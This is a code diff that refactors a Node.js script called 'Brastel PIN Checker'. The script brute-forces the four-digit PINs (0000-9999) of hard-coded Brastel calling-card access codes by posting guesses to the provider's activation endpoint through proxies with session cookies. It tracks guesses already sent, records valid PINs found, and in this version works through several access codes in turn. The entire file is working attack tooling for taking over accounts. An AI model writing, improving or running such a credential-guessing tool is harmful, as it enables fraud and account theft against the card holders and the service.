@@ -1,24 +1,69 @@
 /**
- * Brastel PIN Checker - Refactored Version
+ * Brastel PIN Checker - Enhanced Refactored Version
  * A modular PIN checking system with proxy rotation and concurrent workers
  */
 
 const axios = require('axios');
 const qs = require('qs');
-const fs = require('fs');
+const fsSync = require('fs');
 const path = require('path');
 const { HttpsProxyAgent } = require('https-proxy-agent');
+
+/**
+ * Constants and enums
+ */
+const LOG_LEVELS = {
+  INFO: 'INFO',
+  ERROR: 'ERROR',
+  SUCCESS: 'SUCCESS',
+  WARNING: 'WARNING',
+  PROXY: 'PROXY',
+  FOUND: 'FOUND',
+  SKIP: 'SKIP'
+};
+
+const EMOJIS = {
+  [LOG_LEVELS.INFO]: '🔍',
+  [LOG_LEVELS.ERROR]: '❌',
+  [LOG_LEVELS.SUCCESS]: '✅',
+  [LOG_LEVELS.WARNING]: '⚠️',
+  [LOG_LEVELS.PROXY]: '🛡️',
+  [LOG_LEVELS.FOUND]: '🎯',
+  [LOG_LEVELS.SKIP]: '⏭️'
+};
+
+const API_RESULT_CODES = {
+  SUCCESS: '0',
+  NOT_FOUND: '100'
+};
+
+const FILE_NAMES = {
+  SENT_PINS: 'sent_pins_history.json',
+  BLACKLIST_PINS: 'blacklist_pins.json',
+  VALID_PINS: 'valid_pins_found.json'
+};
 
 /**
  * Configuration object containing all settings
  */
 const CONFIG = {
-  // PIN checking configuration
-  accessCode: '33849108',
-  pinRange: {
-    start: 0,
-    end: 9999
-  },
+  // Multiple accessCodes configuration
+  accessCodes: [
+    {
+      accessCode: '82819563',
+      pinRange: {
+        start: 9995,
+        end: 9999
+      }
+    },
+    {
+      accessCode: '33849108',
+      pinRange: {
+        start: 0,
+        end: 9999
+      }
+    }
+  ],
 
   // Worker configuration
   concurrentWorkers: 1,
@@ -26,6 +71,7 @@ const CONFIG = {
   retryDelay: 3000,
   proxyRotationInterval: 250000, // 250 seconds
   requestTimeout: 60000,
+  maxUndefinedResults: 25, // Stop program if undefined results exceed this
 
   // Folder paths
   folders: {
@@ -38,9 +84,9 @@ const CONFIG = {
     const accessCodeFolder = path.join(this.folders.data, accessCode);
     return {
       folder: accessCodeFolder,
-      sentPins: path.join(accessCodeFolder, 'sent_pins_history.json'),
-      blacklistPins: path.join(accessCodeFolder, 'blacklist_pins.json'),
-      validPins: path.join(accessCodeFolder, 'valid_pins_found.json')
+      sentPins: path.join(accessCodeFolder, FILE_NAMES.SENT_PINS),
+      blacklistPins: path.join(accessCodeFolder, FILE_NAMES.BLACKLIST_PINS),
+      validPins: path.join(accessCodeFolder, FILE_NAMES.VALID_PINS)
     };
   },
 
@@ -77,6 +123,64 @@ const CONFIG = {
 };
 
 /**
+ * Utility functions
+ */
+class Utils {
+  /**
+   * Format PIN with leading zeros
+   * @param {number} pin - PIN number
+   * @returns {string} Formatted PIN
+   */
+  static formatPin(pin) {
+    return pin.toString().padStart(4, '0');
+  }
+
+  /**
+   * Create directory if it doesn't exist
+   * @param {string} dirPath - Directory path
+   */
+  static ensureDirectoryExists(dirPath) {
+    if (!fsSync.existsSync(dirPath)) {
+      fsSync.mkdirSync(dirPath, { recursive: true });
+      return true;
+    }
+    return false;
+  }
+
+  /**
+   * Delay execution
+   * @param {number} ms - Milliseconds to delay
+   */
+  static delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  /**
+   * Generate array of numbers in range
+   * @param {number} start - Start number
+   * @param {number} end - End number
+   * @returns {Array<number>} Array of numbers
+   */
+  static generateRange(start, end) {
+    return Array.from({ length: end - start + 1 }, (_, i) => start + i);
+  }
+
+  /**
+   * Split array into chunks
+   * @param {Array} array - Array to split
+   * @param {number} chunkSize - Size of each chunk
+   * @returns {Array<Array>} Array of chunks
+   */
+  static chunkArray(array, chunkSize) {
+    const chunks = [];
+    for (let i = 0; i < array.length; i += chunkSize) {
+      chunks.push(array.slice(i, i + chunkSize));
+    }
+    return chunks;
+  }
+}
+
+/**
  * File Manager class for handling PIN tracking files
  */
 class FileManager {
@@ -84,8 +188,17 @@ class FileManager {
     this.logger = logger;
     this.accessCode = accessCode;
     this.filePaths = CONFIG.getFilePaths(accessCode);
+    this.cache = new Map(); // Cache for frequently accessed data
+    this.initialize();
+  }
+
+  /**
+   * Initialize file system and cache
+   */
+  initialize() {
     this.ensureFoldersExist();
     this.ensureFilesExist();
+    this.loadCache();
   }
 
   /**
@@ -94,15 +207,13 @@ class FileManager {
   ensureFoldersExist() {
     // Create main folders
     Object.values(CONFIG.folders).forEach(folderPath => {
-      if (!fs.existsSync(folderPath)) {
-        fs.mkdirSync(folderPath, { recursive: true });
+      if (Utils.ensureDirectoryExists(folderPath)) {
         this.logger.info(`Created folder: ${folderPath}`);
       }
     });
 
     // Create accessCode specific folder
-    if (!fs.existsSync(this.filePaths.folder)) {
-      fs.mkdirSync(this.filePaths.folder, { recursive: true });
+    if (Utils.ensureDirectoryExists(this.filePaths.folder)) {
       this.logger.info(`Created accessCode folder: ${this.filePaths.folder}`);
     }
   }
@@ -111,23 +222,41 @@ class FileManager {
    * Ensure all tracking files exist
    */
   ensureFilesExist() {
-    Object.entries(this.filePaths).forEach(([_key, filepath]) => {
-      if (!fs.existsSync(filepath)) {
-        this.writeJsonFile(filepath, []);
+    const filesToCreate = [
+      this.filePaths.sentPins,
+      this.filePaths.blacklistPins,
+      this.filePaths.validPins
+    ];
+
+    filesToCreate.forEach(filepath => {
+      if (!fsSync.existsSync(filepath)) {
+        this.writeJsonFileSync(filepath, []);
         this.logger.info(`Created tracking file for ${this.accessCode}: ${filepath}`);
       }
     });
   }
 
   /**
-   * Read JSON file safely
+   * Load data into cache
+   */
+  loadCache() {
+    try {
+      this.cache.set('sentPins', new Set(this.readJsonFileSync(this.filePaths.sentPins)));
+      this.cache.set('blacklistPins', new Set(this.readJsonFileSync(this.filePaths.blacklistPins)));
+    } catch (error) {
+      this.logger.error(`Error loading cache: ${error.message}`);
+    }
+  }
+
+  /**
+   * Read JSON file safely (synchronous)
    * @param {string} filename - File to read
    * @returns {Array} Array data from file
    */
-  readJsonFile(filename) {
+  readJsonFileSync(filename) {
     try {
-      const data = fs.readFileSync(filename, 'utf8');
-      return JSON.parse(data);
+      const data = fsSync.readFileSync(filename, 'utf8');
+      return JSON.parse(data) || [];
     } catch (error) {
       this.logger.warning(`Error reading ${filename}: ${error.message}`);
       return [];
@@ -135,16 +264,25 @@ class FileManager {
   }
 
   /**
-   * Write JSON file safely
+   * Write JSON file safely (synchronous)
    * @param {string} filename - File to write
    * @param {Array} data - Data to write
    */
-  writeJsonFile(filename, data) {
+  writeJsonFileSync(filename, data) {
     try {
-      fs.writeFileSync(filename, JSON.stringify(data, null, 2));
+      fsSync.writeFileSync(filename, JSON.stringify(data, null, 2));
     } catch (error) {
       this.logger.error(`Error writing ${filename}: ${error.message}`);
     }
+  }
+
+  /**
+   * Check if PIN was already sent (using cache)
+   * @param {string} pin - PIN to check
+   * @returns {boolean} True if already sent
+   */
+  isPinSent(pin) {
+    return this.cache.get('sentPins')?.has(pin) || false;
   }
 
   /**
@@ -152,10 +290,11 @@ class FileManager {
    * @param {string} pin - PIN to add
    */
   addSentPin(pin) {
-    const sentPins = this.readJsonFile(this.filePaths.sentPins);
-    if (!sentPins.includes(pin)) {
-      sentPins.push(pin);
-      this.writeJsonFile(this.filePaths.sentPins, sentPins);
+    const sentPinsSet = this.cache.get('sentPins');
+    if (!sentPinsSet.has(pin)) {
+      sentPinsSet.add(pin);
+      const sentPinsArray = Array.from(sentPinsSet);
+      this.writeJsonFileSync(this.filePaths.sentPins, sentPinsArray);
     }
   }
 
@@ -164,7 +303,16 @@ class FileManager {
    * @returns {Array} Array of sent PINs
    */
   getSentPins() {
-    return this.readJsonFile(this.filePaths.sentPins);
+    return Array.from(this.cache.get('sentPins') || []);
+  }
+
+  /**
+   * Check if PIN is blacklisted (using cache)
+   * @param {string} pin - PIN to check
+   * @returns {boolean} True if blacklisted
+   */
+  isBlacklisted(pin) {
+    return this.cache.get('blacklistPins')?.has(pin) || false;
   }
 
   /**
@@ -172,10 +320,11 @@ class FileManager {
    * @param {string} pin - PIN to blacklist
    */
   addBlacklistPin(pin) {
-    const blacklistPins = this.readJsonFile(this.filePaths.blacklistPins);
-    if (!blacklistPins.includes(pin)) {
-      blacklistPins.push(pin);
-      this.writeJsonFile(this.filePaths.blacklistPins, blacklistPins);
+    const blacklistSet = this.cache.get('blacklistPins');
+    if (!blacklistSet.has(pin)) {
+      blacklistSet.add(pin);
+      const blacklistArray = Array.from(blacklistSet);
+      this.writeJsonFileSync(this.filePaths.blacklistPins, blacklistArray);
       this.logger.warning(`Added PIN ${pin} to blacklist for ${this.accessCode}`);
     }
   }
@@ -185,17 +334,7 @@ class FileManager {
    * @returns {Array} Array of blacklisted PINs
    */
   getBlacklistPins() {
-    return this.readJsonFile(this.filePaths.blacklistPins);
-  }
-
-  /**
-   * Check if PIN is blacklisted
-   * @param {string} pin - PIN to check
-   * @returns {boolean} True if blacklisted
-   */
-  isBlacklisted(pin) {
-    const blacklistPins = this.getBlacklistPins();
-    return blacklistPins.includes(pin);
+    return Array.from(this.cache.get('blacklistPins') || []);
   }
 
   /**
@@ -203,14 +342,14 @@ class FileManager {
    * @param {string} pin - Valid PIN found
    */
   addValidPin(pin) {
-    const validPins = this.readJsonFile(this.filePaths.validPins);
+    const validPins = this.readJsonFileSync(this.filePaths.validPins);
     const entry = {
       pin,
       accessCode: this.accessCode,
       timestamp: new Date().toISOString()
     };
     validPins.push(entry);
-    this.writeJsonFile(this.filePaths.validPins, validPins);
+    this.writeJsonFileSync(this.filePaths.validPins, validPins);
     this.logger.found(`Saved valid PIN for ${this.accessCode} to file: ${pin}`);
   }
 
@@ -219,7 +358,21 @@ class FileManager {
    * @returns {Array} Array of valid PINs
    */
   getValidPins() {
-    return this.readJsonFile(this.filePaths.validPins);
+    return this.readJsonFileSync(this.filePaths.validPins);
+  }
+
+  /**
+   * Get statistics
+   * @returns {Object} Statistics object
+   */
+  getStatistics() {
+    return {
+      sentPinsCount: this.cache.get('sentPins')?.size || 0,
+      blacklistPinsCount: this.cache.get('blacklistPins')?.size || 0,
+      validPinsCount: this.getValidPins().length,
+      blacklistedPins: this.getBlacklistPins(),
+      validPins: this.getValidPins()
+    };
   }
 }
 
@@ -229,58 +382,39 @@ class FileManager {
 class Logger {
   constructor(accessCode) {
     this.accessCode = accessCode;
-    this.ensureLogFolder();
     this.logFile = path.join(CONFIG.folders.logs, `log_${accessCode}.txt`);
+    this.initialize();
   }
 
   /**
-   * Ensure log folder exists
+   * Initialize logger
    */
-  ensureLogFolder() {
-    if (!fs.existsSync(CONFIG.folders.logs)) {
-      fs.mkdirSync(CONFIG.folders.logs, { recursive: true });
-    }
+  initialize() {
+    Utils.ensureDirectoryExists(CONFIG.folders.logs);
   }
 
   /**
    * Log a message to both console and file
    * @param {string} message - Message to log
-   * @param {string} level - Log level (INFO, ERROR, SUCCESS, WARNING)
+   * @param {string} level - Log level
    */
-  log(message, level = 'INFO') {
+  log(message, level = LOG_LEVELS.INFO) {
     const timestamp = new Date().toISOString();
-    const emoji = this.getEmoji(level);
+    const emoji = EMOJIS[level] || '📝';
     const fullMessage = `[${timestamp}] ${emoji} [${this.accessCode}] ${message}`;
 
     console.log(fullMessage);
-    fs.appendFileSync(this.logFile, `${fullMessage}\n`);
+    fsSync.appendFileSync(this.logFile, `${fullMessage}\n`);
   }
 
-  /**
-   * Get emoji based on log level
-   * @param {string} level - Log level
-   * @returns {string} Emoji for the level
-   */
-  getEmoji(level) {
-    const emojis = {
-      INFO: '🔍',
-      ERROR: '❌',
-      SUCCESS: '✅',
-      WARNING: '⚠️',
-      PROXY: '🛡️',
-      FOUND: '🎯',
-      SKIP: '⏭️'
-    };
-    return emojis[level] || '📝';
-  }
-
-  info(message) { this.log(message, 'INFO'); }
-  error(message) { this.log(message, 'ERROR'); }
-  success(message) { this.log(message, 'SUCCESS'); }
-  warning(message) { this.log(message, 'WARNING'); }
-  proxy(message) { this.log(message, 'PROXY'); }
-  found(message) { this.log(message, 'FOUND'); }
-  skip(message) { this.log(message, 'SKIP'); }
+  // Convenience methods
+  info(message) { this.log(message, LOG_LEVELS.INFO); }
+  error(message) { this.log(message, LOG_LEVELS.ERROR); }
+  success(message) { this.log(message, LOG_LEVELS.SUCCESS); }
+  warning(message) { this.log(message, LOG_LEVELS.WARNING); }
+  proxy(message) { this.log(message, LOG_LEVELS.PROXY); }
+  found(message) { this.log(message, LOG_LEVELS.FOUND); }
+  skip(message) { this.log(message, LOG_LEVELS.SKIP); }
 }
 
 /**
@@ -298,15 +432,78 @@ class ProxyManager {
    */
   createStaticProxy(proxyUrl) {
     if (!proxyUrl) return null;
-    return new HttpsProxyAgent(proxyUrl);
+    try {
+      return new HttpsProxyAgent(proxyUrl);
+    } catch (error) {
+      this.logger.error(`Failed to create proxy agent: ${error.message}`);
+      return null;
+    }
+  }
+}
+
+/**
+ * API Request class for handling HTTP requests
+ */
+class ApiRequest {
+  constructor(logger, proxyManager) {
+    this.logger = logger;
+    this.proxyManager = proxyManager;
   }
 
   /**
-   * Delay function
-   * @param {number} ms - Milliseconds to delay
+   * Create request configuration
+   * @param {Object} agent - Proxy agent
+   * @param {string} cookie - Cookie string
+   * @returns {Object} Request configuration
    */
-  delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
+  createRequestConfig(agent, cookie) {
+    const config = {
+      headers: {
+        ...CONFIG.api.headers,
+        'Cookie': cookie
+      },
+      proxy: false,
+      timeout: CONFIG.requestTimeout
+    };
+
+    if (agent) {
+      config.httpsAgent = agent;
+    }
+
+    return config;
+  }
+
+  /**
+   * Create request data
+   * @param {string} accessCode - Access code
+   * @param {string} pin - PIN to check
+   * @returns {Object} Request data
+   */
+  createRequestData(accessCode, pin) {
+    return {
+      xslFile: 'ajax_sip_050_activation.xsl',
+      action: 'ReturnSPCNumber',
+      accessCode,
+      style: '14',
+      service: '1',
+      pin
+    };
+  }
+
+  /**
+   * Make API request
+   * @param {string} accessCode - Access code
+   * @param {string} pin - PIN to check
+   * @param {Object} agent - Proxy agent
+   * @param {string} cookie - Cookie string
+   * @returns {Promise<Object>} Response data
+   */
+  async makeRequest(accessCode, pin, agent, cookie) {
+    const requestConfig = this.createRequestConfig(agent, cookie);
+    const data = this.createRequestData(accessCode, pin);
+
+    const response = await axios.post(CONFIG.api.url, qs.stringify(data), requestConfig);
+    return response.data;
   }
 }
 
@@ -314,11 +511,78 @@ class ProxyManager {
  * PIN Checker class for handling PIN validation requests
  */
 class PinChecker {
-  constructor(logger, proxyManager, fileManager) {
+  constructor(logger, proxyManager, fileManager, accessCode) {
     this.logger = logger;
     this.proxyManager = proxyManager;
     this.fileManager = fileManager;
+    this.accessCode = accessCode;
+    this.apiRequest = new ApiRequest(logger, proxyManager);
     this.found = false;
+    this.undefinedCount = 0; // Per-worker undefined counter
+    this.shouldStopWorker = false; // Per-worker stop flag
+  }
+
+  /**
+   * Check if should stop processing
+   * @returns {boolean} True if should stop
+   */
+  shouldStop() {
+    return this.found || this.shouldStopWorker;
+  }
+
+  /**
+   * Reset undefined counter when getting valid results
+   */
+  resetUndefinedCount() {
+    this.undefinedCount = 0;
+  }
+
+  /**
+   * Handle undefined result
+   * @param {string} pin - PIN being checked
+   * @param {number} workerId - Worker ID
+   * @returns {boolean} True if should stop this worker
+   */
+  handleUndefinedResult(pin, workerId) {
+    this.undefinedCount++;
+    this.logger.warning(`Worker ${workerId} - Error checking PIN ${pin} (Worker undefined count: ${this.undefinedCount}/${CONFIG.maxUndefinedResults})`);
+
+    if (this.undefinedCount >= CONFIG.maxUndefinedResults) {
+      this.shouldStopWorker = true;
+      this.logger.error(`Worker ${workerId} - Undefined results limit exceeded (${this.undefinedCount}/${CONFIG.maxUndefinedResults}). Stopping this worker only.`);
+      return true;
+    }
+    return false;
+  }
+
+  /**
+   * Process API result
+   * @param {Object} result - API response
+   * @param {string} pin - PIN being checked
+   * @param {number} workerId - Worker ID
+   * @returns {boolean} True if PIN is valid
+   */
+  processResult(result, pin, workerId) {
+    this.logger.info(`Worker ${workerId} - PIN: ${pin} | Result: ${result.result} - ${result.errorMsg}`);
+
+    // Reset undefined counter since we got a valid response
+    this.resetUndefinedCount();
+
+    if (result.result === API_RESULT_CODES.SUCCESS) {
+      // Check if this PIN is blacklisted
+      if (this.fileManager.isBlacklisted(pin)) {
+        this.logger.warning(`Worker ${workerId} - PIN ${pin} is blacklisted but returned success. Continuing...`);
+        return false; // Continue processing instead of stopping
+      }
+
+      // Valid PIN found
+      this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin} (${this.accessCode})`);
+      this.fileManager.addValidPin(pin);
+      this.found = true;
+      return true;
+    }
+
+    return false; // PIN is invalid or other result
   }
 
   /**
@@ -327,82 +591,35 @@ class PinChecker {
    * @param {Object} agent - Proxy agent
    * @param {string} cookie - Cookie string
    * @param {number} workerId - Worker ID
-   * @returns {boolean} True if PIN is valid
+   * @returns {Promise<boolean>} True if PIN is valid
    */
   async checkPin(pin, agent, cookie, workerId) {
-    const headers = {
-      ...CONFIG.api.headers,
-      'Cookie': cookie
-    };
-
-    const data = {
-      xslFile: 'ajax_sip_050_activation.xsl',
-      action: 'ReturnSPCNumber',
-      accessCode: CONFIG.accessCode,
-      style: '14',
-      service: '1',
-      pin
-    };
-
     for (let attempt = 1; attempt <= CONFIG.maxRetries; attempt++) {
-      if (this.found) return false;
+      if (this.shouldStop()) return false;
 
       try {
-        const requestConfig = {
-          headers,
-          proxy: false,
-          timeout: CONFIG.requestTimeout
-        };
-
-        if (agent) {
-          requestConfig.httpsAgent = agent;
-        }
-
-        const response = await axios.post(CONFIG.api.url, qs.stringify(data), requestConfig);
-        const result = response.data;
-
-        this.logger.info(`Worker ${workerId} - PIN: ${pin} | Status: ${response.status} | Result: ${result.result} - ${result.errorMsg}`);
+        const result = await this.apiRequest.makeRequest(this.accessCode, pin, agent, cookie);
 
         if (result.result === undefined) {
-          this.logger.warning(`Worker ${workerId} - Error checking PIN ${pin}`);
-          await this.proxyManager.delay(CONFIG.retryDelay);
-        } else {
-          // Mark PIN as sent first
-          this.fileManager.addSentPin(pin);
-          if (result.result === '0') {
-            // Check if this PIN is blacklisted
-            if (this.fileManager.isBlacklisted(pin)) {
-              this.logger.warning(`Worker ${workerId} - PIN ${pin} is blacklisted but returned success. Continuing...`);
-              return false; // Continue processing instead of stopping
-            }
-
-            // Valid PIN found
-            this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin} (${CONFIG.accessCode})`);
-            this.fileManager.addValidPin(pin);
-            this.found = true;
-            return true;
-          } else {
-            // PIN is invalid, continue processing
+          if (this.handleUndefinedResult(pin, workerId)) {
             return false;
           }
+          await Utils.delay(CONFIG.retryDelay);
+          continue;
         }
+
+        // Mark PIN as sent
+        this.fileManager.addSentPin(pin);
+        return this.processResult(result, pin, workerId);
+
       } catch (error) {
         this.logger.error(`Worker ${workerId} - Error checking PIN ${pin} (attempt ${attempt}): ${error.message}`);
         if (attempt < CONFIG.maxRetries) {
-          await this.proxyManager.delay(CONFIG.retryDelay);
+          await Utils.delay(CONFIG.retryDelay);
         }
       }
     }
     return false;
-  }
-
-  /**
-   * Format PIN with leading zeros
-   * @param {number} pin - PIN number
-   * @returns {string} Formatted PIN
-   */
-  formatPin(pin) {
-    return (`0000${pin}`).slice(-4);
   }
 }
 
@@ -419,96 +636,89 @@ class Worker {
   }
 
   /**
+   * Filter out already sent PINs
+   * @param {Array<number>} pins - Array of PINs to check
+   * @returns {Array<string>} Array of unsent formatted PINs
+   */
+  filterUnsentPins(pins) {
+    return pins
+      .map(pin => Utils.formatPin(pin))
+      .filter(formattedPin => {
+        if (this.fileManager.isPinSent(formattedPin)) {
+          this.logger.skip(`Worker ${this.id} - Skipping already sent PIN: ${formattedPin}`);
+          return false;
+        }
+        return true;
+      });
+  }
+
+  /**
    * Process a list of PINs
-   * @param {Array} pins - Array of PINs to check
+   * @param {Array<number>} pins - Array of PINs to check
    * @param {string} cookie - Cookie string
    * @param {string} staticProxy - Static proxy URL
    */
   async process(pins, cookie, staticProxy) {
     const agent = this.proxyManager.createStaticProxy(staticProxy);
-    // const lastRotate = Date.now(); // For future proxy rotation
+    const unsentPins = this.filterUnsentPins(pins);
 
-    // Get already sent PINs to skip
-    const sentPins = this.fileManager.getSentPins();
-
-    for (const pin of pins) {
-      if (this.pinChecker.found) return;
-
-      const formattedPin = this.pinChecker.formatPin(pin);
-
-      // Skip if PIN was already sent
-      if (sentPins.includes(formattedPin)) {
-        this.logger.skip(`Worker ${this.id} - Skipping already sent PIN: ${formattedPin}`);
-        continue;
-      }
-
-      await this.pinChecker.checkPin(formattedPin, agent, cookie, this.id);
+    for (const pin of unsentPins) {
+      if (this.pinChecker.shouldStop()) return;
+      await this.pinChecker.checkPin(pin, agent, cookie, this.id);
     }
   }
 }
 
 /**
- * Main application class
+ * Single Access Code Checker - handles one accessCode
  */
-class BrastelPinChecker {
-  constructor() {
-    this.accessCode = CONFIG.accessCode;
+class SingleAccessCodeChecker {
+  constructor(accessCodeConfig) {
+    this.accessCode = accessCodeConfig.accessCode;
+    this.pinRange = accessCodeConfig.pinRange;
     this.logger = new Logger(this.accessCode);
     this.fileManager = new FileManager(this.logger, this.accessCode);
     this.proxyManager = new ProxyManager(this.logger);
-    this.pinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager);
+    this.pinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager, this.accessCode);
   }
 
   /**
-   * Generate PIN range
-   * @returns {Array} Array of PINs to check
+   * Generate PIN range for this accessCode
+   * @returns {Array<number>} Array of PINs to check
    */
   generatePinRange() {
-    const pins = [];
-    for (let i = CONFIG.pinRange.start; i <= CONFIG.pinRange.end; i++) {
-      pins.push(i);
-    }
-    return pins;
+    return Utils.generateRange(this.pinRange.start, this.pinRange.end);
   }
 
   /**
    * Distribute PINs among workers
-   * @param {Array} pins - Array of PINs
-   * @returns {Array} Array of PIN batches for workers
+   * @param {Array<number>} pins - Array of PINs
+   * @returns {Array<Array<number>>} Array of PIN batches for workers
    */
   distributePins(pins) {
     const batchSize = Math.ceil(pins.length / CONFIG.concurrentWorkers);
-    const batches = [];
-
-    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
-      const start = i * batchSize;
-      const end = Math.min((i + 1) * batchSize, pins.length);
-      batches.push(pins.slice(start, end));
-    }
-
-    return batches;
+    return Utils.chunkArray(pins, batchSize);
   }
 
   /**
-   * Display statistics
+   * Display statistics for this accessCode
    */
   displayStats() {
-    const sentPins = this.fileManager.getSentPins();
-    const blacklistPins = this.fileManager.getBlacklistPins();
-    const validPins = this.fileManager.getValidPins();
+    const stats = this.fileManager.getStatistics();
 
     this.logger.info('=== STATISTICS ===');
     this.logger.info(`Access Code: ${this.accessCode}`);
-    this.logger.info(`Total PINs sent: ${sentPins.length}`);
-    this.logger.info(`Blacklisted PINs: ${blacklistPins.length}`);
-    this.logger.info(`Valid PINs found: ${validPins.length}`);
+    this.logger.info(`PIN Range: ${this.pinRange.start} - ${this.pinRange.end}`);
+    this.logger.info(`Total PINs sent: ${stats.sentPinsCount}`);
+    this.logger.info(`Blacklisted PINs: ${stats.blacklistPinsCount}`);
+    this.logger.info(`Valid PINs found: ${stats.validPinsCount}`);
 
-    if (blacklistPins.length > 0) {
-      this.logger.info(`Blacklisted: ${blacklistPins.join(', ')}`);
+    if (stats.blacklistedPins.length > 0) {
+      this.logger.info(`Blacklisted: ${stats.blacklistedPins.join(', ')}`);
     }
 
-    if (validPins.length > 0) {
-      this.logger.success(`Valid PINs: ${validPins.map(p => p.pin).join(', ')}`);
+    if (stats.validPins.length > 0) {
+      this.logger.success(`Valid PINs: ${stats.validPins.map(p => p.pin).join(', ')}`);
     }
 
     this.logger.info('Files location:');
@@ -518,11 +728,31 @@ class BrastelPinChecker {
   }
 
   /**
-   * Start the PIN checking process
+   * Create workers
+   * @param {Array<Array<number>>} pinBatches - PIN batches for workers
+   * @returns {Array<Promise>} Array of worker promises
+   */
+  createWorkers(pinBatches) {
+    const workers = [];
+
+    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
+      const worker = new Worker(i + 1, this.logger, this.proxyManager, this.pinChecker, this.fileManager);
+      const cookie = CONFIG.cookies[i] || CONFIG.cookies[0]; // Fallback to first cookie
+      const staticProxy = CONFIG.proxies[i] || CONFIG.proxies[0]; // Fallback to first proxy
+
+      workers.push(worker.process(pinBatches[i] || [], cookie, staticProxy));
+    }
+
+    return workers;
+  }
+
+  /**
+   * Start the PIN checking process for this accessCode
+   * @returns {Promise<boolean>} True if should continue to next accessCode
    */
   async start() {
-    this.logger.info('Starting Brastel PIN Checker...');
-    this.logger.info(`PIN Range: ${CONFIG.pinRange.start} - ${CONFIG.pinRange.end}`);
+    this.logger.info(`Starting PIN Checker for AccessCode: ${this.accessCode}`);
+    this.logger.info(`PIN Range: ${this.pinRange.start} - ${this.pinRange.end}`);
     this.logger.info(`Concurrent Workers: ${CONFIG.concurrentWorkers}`);
 
     // Display current statistics
@@ -530,21 +760,108 @@ class BrastelPinChecker {
 
     const pins = this.generatePinRange();
     const pinBatches = this.distributePins(pins);
-    const workers = [];
-
-    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
-      const worker = new Worker(i + 1, this.logger, this.proxyManager, this.pinChecker, this.fileManager);
-      const cookie = CONFIG.cookies[i];
-      const staticProxy = CONFIG.proxies[i];
-
-      workers.push(worker.process(pinBatches[i], cookie, staticProxy));
-    }
+    const workers = this.createWorkers(pinBatches);
 
     await Promise.all(workers);
-    this.logger.success('All workers completed.');
+
+    this.logger.success(`Completed processing accessCode: ${this.accessCode}`);
 
     // Display final statistics
     this.displayStats();
+
+    return true; // Continue to next accessCode
+  }
+}
+
+/**
+ * Main application class - handles multiple accessCodes
+ */
+class BrastelPinChecker {
+  constructor() {
+    this.accessCodes = CONFIG.accessCodes;
+  }
+
+  /**
+   * Display application header
+   */
+  displayHeader() {
+    console.log('🚀 Starting Brastel PIN Checker with Multiple AccessCodes...');
+    console.log(`📋 Total AccessCodes to process: ${this.accessCodes.length}`);
+    console.log(`⚠️ Per-worker undefined limit: ${CONFIG.maxUndefinedResults}`);
+    console.log('==========================================');
+  }
+
+  /**
+   * Display application footer
+   */
+  displayFooter() {
+    console.log('\n🎉 All AccessCodes processing completed.');
+  }
+
+  /**
+   * Process single access code
+   * @param {Object} accessCodeConfig - Access code configuration
+   * @param {number} index - Index of current access code
+   * @returns {Promise<boolean>} True if should continue
+   */
+  async processAccessCode(accessCodeConfig, index) {
+    console.log(`\n🎯 Processing AccessCode ${index + 1}/${this.accessCodes.length}: ${accessCodeConfig.accessCode}`);
+    console.log('==========================================');
+
+    const checker = new SingleAccessCodeChecker(accessCodeConfig);
+    const shouldContinue = await checker.start();
+
+    if (!shouldContinue) {
+      console.log('\n❌ Stopping all processing due to global undefined limit exceeded.');
+      return false;
+    }
+
+    // If this is not the last accessCode, show transition message
+    if (index < this.accessCodes.length - 1) {
+      console.log(`\n✅ Completed ${accessCodeConfig.accessCode}. Moving to next accessCode...`);
+      console.log('==========================================');
+    }
+
+    return true;
+  }
+
+  /**
+   * Validate configuration
+   * @throws {Error} If configuration is invalid
+   */
+  validateConfiguration() {
+    if (!Array.isArray(this.accessCodes) || this.accessCodes.length === 0) {
+      throw new Error('No access codes configured');
+    }
+
+    for (const config of this.accessCodes) {
+      if (!config.accessCode || !config.pinRange) {
+        throw new Error('Invalid access code configuration');
+      }
+      if (config.pinRange.start > config.pinRange.end) {
+        throw new Error(`Invalid PIN range for ${config.accessCode}`);
+      }
+    }
+  }
+
+  /**
+   * Start the PIN checking process for all accessCodes
+   */
+  async start() {
+    try {
+      this.validateConfiguration();
+      this.displayHeader();
+
+      for (let i = 0; i < this.accessCodes.length; i++) {
+        const shouldContinue = await this.processAccessCode(this.accessCodes[i], i);
+        if (!shouldContinue) break;
+      }
+
+      this.displayFooter();
+    } catch (error) {
+      console.error(`❌ Application error: ${error.message}`);
+      throw error;
+    }
   }
 }
 
@@ -552,9 +869,15 @@ class BrastelPinChecker {
 if (require.main === module) {
   const app = new BrastelPinChecker();
   app.start().catch(error => {
-    console.error('Application error:', error);
+    console.error('Fatal error:', error);
     process.exit(1);
   });
 }
 
-module.exports = { BrastelPinChecker, CONFIG };
+module.exports = {
+  BrastelPinChecker,
+  CONFIG,
+  Utils,
+  LOG_LEVELS,
+  API_RESULT_CODES
+};
